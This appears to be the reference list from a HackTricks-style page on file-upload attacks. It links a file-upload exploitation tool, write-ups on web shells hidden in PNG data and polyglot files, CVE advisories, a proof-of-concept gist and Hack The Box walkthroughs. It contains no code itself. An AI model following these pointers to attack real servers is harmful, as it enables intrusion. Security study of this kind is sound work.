- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

{{#include ../../banners/hacktricks-training.md}}
